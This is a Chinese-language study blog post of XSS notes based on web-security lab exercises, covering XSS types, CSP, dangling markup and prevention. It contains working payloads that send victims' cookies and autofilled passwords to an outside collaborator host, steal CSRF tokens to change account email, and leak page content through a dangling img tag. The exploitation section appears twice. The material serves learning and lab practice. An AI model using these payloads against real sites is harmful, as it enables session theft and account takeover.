---
title: "XSS-跨站脚本"
description: 
slug: 
date: 
image:
categories:
    - stu
tags:
    - XSS
weight: 1
---





## 一、XSS

### 1.描述

跨站脚本攻击（XSS）：一种web安全漏洞，攻击者可以利用它破坏用户与以受攻击应用程序的交互。

原理：操纵存在漏洞的网站使其向用户返回恶意JS代码，当用户使用浏览器访问该网站时，恶意代码将在该浏览器中执行，攻击者就能完全控制用户与应用程序的交互。

![](https://img.xiaoyuwell.top/PicGo/20260927162827352.png)

### 2.XSS概念验证

#### 有效载荷

##### 1.alert（）

##### 2.print（）

### 3.XSS类型分类

#### 1.反射型XSS：其中恶意脚本来自当前的HTTP请求

##### 1.描述

当应用程序接受到HTTP请求中的数据，并以不安全的方式将该数据包在立即返回的响应中时，就会发生反射型XSS。

XSS示例：

假设某个网站拥有搜索功能，该功能通过URL参数来接受用户输入的搜索词

```
https://insecure-website.com/search?term=gift
```

在对应URL的响应中会重复显示所输入的搜索词

```
<p>You searched for: cj</p>
```

假设该应用程序不对数据进行任何其他处理，那么攻击者可以构造如下攻击方式：

```
https://insecure-website.com/search?term=<script>alert(1)</script>
```

![](https://img.xiaoyuwell.top/PicGo/20260927200838754.png)

危害：
如果用户访问攻击构造的URL,攻击者的脚本就会在用户的浏览器执行并处于用户于应用程序的会话中。
此时，脚本可以执行用户有权访问的任何操作并检索用户有权访问的任何数据。

常见提交：
评论、昵称、订单联系方式、邮件、等

留言版示例：

```
<p>Hello, this is my message!</p>
```

危害：

该程序不会对数据进行任何处理，因此攻击者可以很容易地发送其他用户的消息：

```
<p><script>/* Bad stuff here... */</script></p>
```



##### 2.利用XSS

###### 1.Cookie窃取

1.使用burp点击劫持生成子域名：

```
https://0a89006b037b517e809821fd004e004d.web-security-academy.net/
```

2.在测试点处输入

```
<script>
fetch('https://g7o14ull4s394l96hylsg9q9p0vtjl7a.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

该脚本会使所有查看该评论的人，向公共写作服务器上的子域名发送包含Cookie信息的POST请求

![](https://img.xiaoyuwell.top/PicGo/20261004201516229.png)

请记下 POST 请求体中，受害者所拥有的 Cookie 的值。

###### 2.密码获取

如今，许多用户都使用密码管理器来自动填写密码。你可以利用这一机制：创建一个密码输入框，获取自动填充的密码，然后将其发送到你自己的域名下。这样一来，就能避免因 Cookie 被窃取而带来的各种问题。此外，由于受害者可能在其他账户中也重复使用了同一组密码，因此你还能获取这些账户的访问权限。

缺点在于：它只适用于那些使用了能够自动填写密码的密码管理工具的用户。当然，如果用户没有将密码保存在密码管理工具中，那么仍然可以通过网络钓鱼等方式来获取用户的密码。不过，这两种方式的效果并不完全相同。

测试点输入：

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://f9p06tnk6r586kb5jxnri8s8rzxtlj98.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

![](https://img.xiaoyuwell.top/PicGo/20261004221411202.png)

###### 3.绕过 CSRF 保护机制(存储型XSS)

一些网站允许已登录的用户无需重新输入密码即可更改电子邮件地址。如果你在这些网站中发现了 XSS 漏洞，就可以利用该漏洞来窃取 CSRF 令牌。有了这个令牌，你就可以将受害者的电子邮件地址更改为自己能控制的地址。之后，你还可以触发密码重置流程，从而获取该账户的访问权限。

在名为 `token` 的隐藏输入字段中，包含了一个用于防止 CSRF 攻击的令牌。

这意味着，你的攻击手段需要先加载用户账户页面，提取 CSRF 令牌，然后再利用该令牌来更改受害者的电子邮件地址。

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```



#### 2.存储型XSS：其中恶意脚本来自网站的数据库

应用程序从不受信任的来源接受数据，并以不安全的方式将该数据包含在后续的HTTP请求响应中。

#### 3.基于DOM的XSS：存在于客户端代码而不是服务端代码中

程序包含一些用户端JS以不安全的方式处理来自不信任开源的数据时发生的攻击，通常是通过将数据写回DOM来实现的。

示例，JS从输入代码字段读取值并将该值写入HTML：

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

危害：
如果攻击者能够控制输入字段值，可以构造一个恶意值从而实现脚本执行：

```
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

输入字段会填充HTTP请求中的一部分（如URL查询字符串参数），从而实现恶意URL攻击，与反射型XSS相同



### 4.XSS用途

1.冒充或者伪装成受害者；

2.执行用户能够执行的任何操作；

3.读取用户有权访问的任何数据；

4.获取用户的登录凭据；

5.对网站进行虚拟篡改；

6.在网站中注入木马程序功能。

### 5.XSS影响

### 6.查找和测试XSS

#### 1.burpsuite的web漏洞扫描器

#### 2.手动测试

1.向程序入口点提交一些简单的唯一输入（如一个简短的字母、数字、字符串），识别HTTP响应中返回该输入的位置并逐个测试，以确认是否可以使用精心构造的输入来执行任意JS代码。

2.手动测试由URL参数引起的基于DOM的XSS漏洞涉及类似的过程：

在参数中放置一些简单的唯一输入，使用浏览器的开发者工具在DOM中搜索该输入，并测试每个位置以确定其是否可以被利用。

3.JS代码审计：

查找非URL输入（如<url>document.cookie)或者非HTML接收器（如<html>setTimout)

Burpsuite中也结合了静态和动态分析，可用检测基于DOM的漏洞

#### 3.Burpsuite-MCP

可结合AI捕获的数据包进行分析

### 7.内容安全策略（CSP）

#### 1.描述

CSP是一种浏览器机制，旨在减轻跨站脚本攻击和其他一些漏洞的影响。该机制通过限制页面可以加载的资源类型（如脚本和图片），以及限制页面是否可以被其他页面嵌入来发挥作用。

如果CSP的应用程序存在类似XSS的行为，那么CSP可能会阻碍或阻止漏洞利用。

要启用 CSP 功能，响应中必须包含一个名为 `Content-Security-Policy` 的 HTTP 响应头，该头的值即为相应的策略内容。该策略由一个或多个指令组成，这些指令之间用分号分隔。

但，攻击者通常可以绕过CSP，从而利用底层漏洞。

#### 2.利用 CSP 来减轻 XSS 攻击的威胁

以下规则仅允许从与当前页面相同的来源加载脚本：

```
script-src 'self'
```

以下指令仅允许从特定域名加载脚本：

```
script-src https://scripts.normal-website.com
```

在允许来自外部域的脚本执行时必须格外小心。如果攻击者能够控制从外部域发送的内容，那么他们就有可能发动攻击。例如，那些不使用针对特定用户的 URL 地址的内容分发网络，就不应被信任，因为第三方可以将内容发布到这些网站上。

除了将特定域名列入白名单外，内容安全策略还提供了另外两种指定可信资源的方式：随机数和哈希值。

CSP 指令可以指定一个随机值，而在加载脚本的标签中，必须使用与指令中指定的随机值相同的数值。如果这两个值不一致，那么脚本就无法执行。为了确保其有效性，该随机值必须在每次页面加载时都重新生成，且攻击者无法猜测该随机值的数值。

CSP 指令可以指定受信任脚本内容的哈希值。如果实际脚本的哈希值与指令中指定的值不一致，那么该脚本将无法被执行。如果脚本的内容发生了变化，那么当然需要更新指令中指定的哈希值。

CSP 阻止像 `script` 这样的资源访问是很常见的现象。不过，许多 CSP 允许对图片的请求。这意味着，你可以利用 `img` 元素来向外部服务器发送请求，从而获取 CSRF 令牌等信息。

#### 3.利用 CSP 来缓解悬空标记攻击

#### 4.通过策略注入来绕过 CSP 限制

#### 5.利用 CSP 防止点击劫持攻击

### 8.悬空标记注入

#### 1.描述

悬空标记注入是一种可用于跨站捕获数据的技术，尤其使用与输入过滤器或其他防御措施而无法进行完整跨站脚本攻击的情况。

它通常可用于捕获其他用户可见的敏感信息，包括可用于代表用户执行未经授权操作的CSRF令牌。

假设某个应用程序以不安全的方式，将受攻击者控制的数据嵌入到其响应中：

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

假设该应用程序也不对 `>` 或 `"` 字符进行过滤或转义处理。那么，攻击者可以利用以下语法来突破被引用的属性值及相应的标签结构，从而重新回到 HTML 环境中：

```
">
```

在这种情况下，攻击者自然会试图发动 XSS 攻击。不过，如果由于输入过滤、内容安全策略等因素，常规的 XSS 攻击无法实现，那么仍然有可能通过以下方式来发动攻击：注入恶意标记。

```
"><img src='//attacker-website.com?
```

该恶意代码会创建一个 `img` 标签，并标记出 `src` 属性的起始位置。该 `src` 属性中包含着攻击者服务器上的 URL 地址。需要注意的是，攻击者并未关闭 `src` 属性，导致该属性处于“悬空”状态。当浏览器解析响应内容时，它会一直向前查找，直到遇到第一个单引号为止，该单引号用于结束该属性。在该单引号之前的所有内容都会被视为 URL 的一部分，并作为 URL 查询字符串的一部分被发送到攻击者的服务器上。所有非字母数字字符，包括换行符，都会被进行 URL 编码处理。

这种攻击的后果是：攻击者能够截取应用程序在注入点之后的部分响应内容。这些响应内容可能包含敏感数据。根据应用程序的功能不同，这些敏感数据可能包括 CSRF 令牌、电子邮件内容或财务数据。

任何可用于发起外部请求的属性，都可以被用来构建“悬挂式标记”。

#### 2.示例

采用了严格的 CSP 策略，从而防止浏览器从外部域名加载各种子资源。

需要实施一种攻击手段：绕过 CSP 机制，窃取被模拟的受害用户的 CSRF 令牌，然后利用该令牌来更改用户的电子邮件地址 。

#### 3.如何防范悬空标记攻击

可以采用与防止跨站脚本攻击相同的防御措施来避免悬空标记攻击。具体来说，就是对输出的数据进行编码，同时在对输入数据进行验证。

你还可以利用内容安全策略来减轻一些悬空标记攻击带来的威胁。例如，通过制定相应的策略来阻止像 `img` 这样的标签加载外部资源，从而避免部分攻击的发生。不过，这种策略并不能完全防止所有攻击。

### 9.如何预防XSS

#### 1.有效防止XSS漏洞可结合一下措施：

#### 1.输入到达时即进行过滤：

在接受用户输入时先对输入进行过滤处理，再存储或者其他。

#### 2.对输出数据进行编码：

在HTTP响应中输出用户可控数据时，对输出进行编码() HTML、URL、JavaScript 、 CSS )，以防止其被解释为活动内容。

#### 3.使用合适的响应头：

为了防止HTTP响应中出现XSS（这些响应并非旨在包含任何HTML或者JS)，可以使用<head>Content-Type和X-Content-Type-Options<head>标头来确认浏览器按照你的预期方式解释响应。

#### 4.内容安全策略（CSP）

### 10.利用XSS

###### 1.Cookie窃取

1.使用burp点击劫持生成子域名：

```
https://0a89006b037b517e809821fd004e004d.web-security-academy.net/
```

2.在测试点处输入

```
<script>
fetch('https://g7o14ull4s394l96hylsg9q9p0vtjl7a.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

该脚本会使所有查看该评论的人，向公共写作服务器上的子域名发送包含Cookie信息的POST请求

![](https://img.xiaoyuwell.top/PicGo/20261004201516229.png)

请记下 POST 请求体中，受害者所拥有的 Cookie 的值。

###### 2.密码获取

如今，许多用户都使用密码管理器来自动填写密码。你可以利用这一机制：创建一个密码输入框，获取自动填充的密码，然后将其发送到你自己的域名下。这样一来，就能避免因 Cookie 被窃取而带来的各种问题。此外，由于受害者可能在其他账户中也重复使用了同一组密码，因此你还能获取这些账户的访问权限。

缺点在于：它只适用于那些使用了能够自动填写密码的密码管理工具的用户。当然，如果用户没有将密码保存在密码管理工具中，那么仍然可以通过网络钓鱼等方式来获取用户的密码。不过，这两种方式的效果并不完全相同。

测试点输入：

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://f9p06tnk6r586kb5jxnri8s8rzxtlj98.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

![](https://img.xiaoyuwell.top/PicGo/20261004221411202.png)

###### 3.绕过 CSRF 保护机制(存储型XSS)

一些网站允许已登录的用户无需重新输入密码即可更改电子邮件地址。如果你在这些网站中发现了 XSS 漏洞，就可以利用该漏洞来窃取 CSRF 令牌。有了这个令牌，你就可以将受害者的电子邮件地址更改为自己能控制的地址。之后，你还可以触发密码重置流程，从而获取该账户的访问权限。

在名为 `token` 的隐藏输入字段中，包含了一个用于防止 CSRF 攻击的令牌。

这意味着，你的攻击手段需要先加载用户账户页面，提取 CSRF 令牌，然后再利用该令牌来更改受害者的电子邮件地址。

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```



